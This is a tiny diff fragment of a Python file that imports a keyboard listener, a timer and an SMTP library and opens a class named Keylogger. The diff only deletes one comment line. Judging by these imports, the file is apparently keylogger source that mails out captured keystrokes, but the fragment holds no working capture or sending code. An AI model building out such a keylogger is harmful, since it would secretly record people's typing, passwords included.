@@ -1,7 +1,6 @@
 from pynput.keyboard import Key, Listener
 from threading import Timer
 import smtplib
-# Creating empty log_file
 
 class Keylogger:
 
